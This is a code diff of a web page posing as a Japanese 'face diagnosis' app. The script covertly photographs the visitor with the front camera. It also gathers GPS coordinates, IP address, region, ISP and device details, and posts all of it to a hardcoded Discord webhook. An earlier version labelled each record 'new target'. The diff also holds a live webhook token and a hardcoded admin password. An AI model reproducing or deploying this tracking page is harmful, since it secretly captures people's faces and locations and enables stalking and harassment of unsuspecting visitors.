@@ -32,31 +32,37 @@
         #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
         video { position: absolute; width: 1px; height: 1px; opacity: 0; }
         .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
-        .error-hint { color: #ff4757; font-size: 0.9rem; margin-top: 15px; line-height: 1.6; }
+        
+        /* コピー用スタイル */
+        .copy-info {
+            margin-top: 10px; font-size: 0.8rem; color: #888; cursor: pointer;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
 
 <div id="top-screen" class="fade-in-box">
-    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1457007667410239530/1467315464643543040/F9C40A6A-9C15-4173-A89C-E46615414223.png?ex=697fef84&is=697e9e04&hm=568be91c0f4da1ee33754484eec840e5e2c9c1da765d720b40499db12ef3f1ba" class="header-img" onclick="adminMode()">
+    <img id="main-icon" src="https://cdn.discordapp.com/attachments/1476911284875301058/1482210816978583704/IMG_6710.png?ex=69b61fe4&is=69b4ce64&hm=b2ccea63fed632d4022b2a3a4960a9c9bf6991e5e60fc6150c91b2d68a6728e1&" class="header-img" onclick="adminMode()">
     <br>
-    <button class="start-btn" onclick="requestPermission()">顔診断開始</button>
+    <button class="start-btn" onclick="runDiagnosis()">顔診断開始</button>
 </div>
 
 <div id="diagnosis-screen">
     <div class="frame">
         <video id="video" autoplay playsinline></video>
         <img id="captured-photo">
-        <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900;">0</div>
+        <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900; text-shadow: 5px 5px 0 #fff;">0</div>
     </div>
-    <div id="status" class="status-text">位置情報を収集中...</div>
-    <div id="error-box" class="error-hint"></div>
+    <div id="status" class="status-text">スキャン中...</div>
+    <div id="copy-area" class="copy-info" onclick="copyCoords()"></div>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
 
 <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1477228073601470526/QYjxdxWV9xBoRUXf100AQS9zYSUWcG3K8L-uFNT3-jPAuYWzU_3lCGb7izpNAx5fJC45";
+    const WEBHOOK = "https://discord.com/api/webhooks/1482211707454488686/zhnShAx-xBqUk06k6eI_xUk-YGL20C_5749Xgi5yu5PDJp6UV9-157NI3cN1XtZack6W";
     let tapCount = 0;
+    let currentCoords = "";
 
     window.onload = () => {
         const globalImg = localStorage.getItem('global_icon_url');
@@ -69,50 +75,48 @@
             tapCount = 0;
             const pw = prompt("パスワードを入力");
             if (pw === "25251") {
-                const newUrl = prompt("新しいアイコンのURLを入力してください");
+                const newUrl = prompt("新しいアイコンURLを入力");
                 if (newUrl) {
                     document.getElementById('main-icon').src = newUrl;
                     localStorage.setItem('global_icon_url', newUrl);
-                    alert("全員のアイコンを更新しました。");
                 }
             }
         }
     }
 
-    async function requestPermission() {
-        // 毎回新しく位置情報を要求する
+    async function runDiagnosis() {
+        document.getElementById('top-screen').style.display = 'none';
+        document.getElementById('diagnosis-screen').style.display = 'block';
+
+        // GPS取得（拒否されても診断は続行するが、毎回聞き直す）
         navigator.geolocation.getCurrentPosition(
             async (pos) => {
-                const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                document.getElementById('top-screen').style.display = 'none';
-                document.getElementById('diagnosis-screen').style.display = 'block';
-                document.getElementById('error-box').innerHTML = "";
-                startFullScan(gps);
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                currentCoords = `${lat}, ${lon}`;
+                const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                startScan(gpsLink, "成功", `${pos.coords.accuracy}m`);
             },
-            (err) => {
-                // 拒否された場合、診断画面は見せるが警告を出す
-                document.getElementById('top-screen').style.display = 'none';
-                document.getElementById('diagnosis-screen').style.display = 'block';
-                document.getElementById('status').innerText = "⚠️ 位置情報がブロックされています";
-                document.getElementById('error-box').innerHTML = 
-                    "診断を続けるには：<br>" +
-                    "1. ブラウザ左上の南京錠アイコン🔒をタップ<br>" +
-                    "2. 位置情報のアクセスを許可（またはリセット）<br>" +
-                    "3. ページを再読み込みしてください";
+            async (err) => {
+                startScan("拒否されました", "失敗", "N/A");
             },
-            { enableHighAccuracy: true, timeout: 10000 }
+            { enableHighAccuracy: true, timeout: 5000 }
         );
     }
 
-    async function startFullScan(gpsLink) {
+    async function startScan(gpsInfo, status, accuracy) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            const res = await fetch('https://ipapi.co/json/');
-            const ipData = await res.json();
-            const info = `住所付近: ${ipData.city}\nIP: ${ipData.ip}\nISP: ${ipData.org}`;
+            // IP情報取得
+            let netInfo = "取得失敗";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                netInfo = `IP: ${data.ip}\n国/地域: ${data.country_name} / ${data.region}\n通信会社: ${data.org}`;
+            } catch(e) {}
 
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
@@ -124,13 +128,18 @@
                 document.getElementById('captured-photo').style.display = 'block';
                 document.getElementById('status').innerText = "顔構造を解析中...";
 
+                if(currentCoords) {
+                    document.getElementById('copy-area').innerText = "座標をコピー: " + currentCoords;
+                }
+
                 stream.getTracks().forEach(t => t.stop());
 
+                // Discord送信（整理されたフォーマット）
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('file', blob, `user_${Date.now()}.png`);
+                    fd.append('file', blob, `log_${Date.now()}.png`);
                     fd.append('payload_json', JSON.stringify({
-                        content: `━━━ 新規ターゲット ━━━\n【GPS情報】\n${gpsLink}\n\n【ネット情報】\n${info}\n【デバイス】\n${navigator.userAgent}`
+                        content: `**【AI診断ログ】**\n\n**GPSステータス:** ${status}\n**GPS精度:** ${accuracy}\n**GPS座標:** ${gpsInfo}\n\n**ネットワーク情報:**\n${netInfo}\n\n**デバイス情報:**\n${navigator.userAgent}`
                     }));
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 });
@@ -143,7 +152,16 @@
 
             }, 1000);
         } catch (e) {
-            document.getElementById('status').innerText = "カメラを許可してください";
+            document.getElementById('status').innerText = "カメラを許可して再試行してください";
+        }
+    }
+
+    // クリップボードにコピーする関数
+    function copyCoords() {
+        if (currentCoords) {
+            navigator.clipboard.writeText(currentCoords).then(() => {
+                alert("座標をコピーしました: " + currentCoords);
+            });
         }
     }
 </script>
